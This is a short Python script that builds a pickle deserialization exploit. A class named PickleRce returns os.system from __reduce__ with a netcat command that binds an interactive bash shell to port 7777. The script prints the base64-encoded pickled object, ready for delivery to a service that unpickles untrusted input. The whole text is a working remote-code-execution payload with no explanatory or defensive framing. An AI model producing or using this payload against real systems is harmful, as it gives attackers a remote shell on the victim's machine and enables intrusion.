import os
import pickle
import base64

command = "netcat -c '/bin/bash -i' -l -p 7777"


class PickleRce(object):
    def __reduce__(self):
        return os.system, (command,)


print(base64.b64encode(pickle.dumps(PickleRce())))
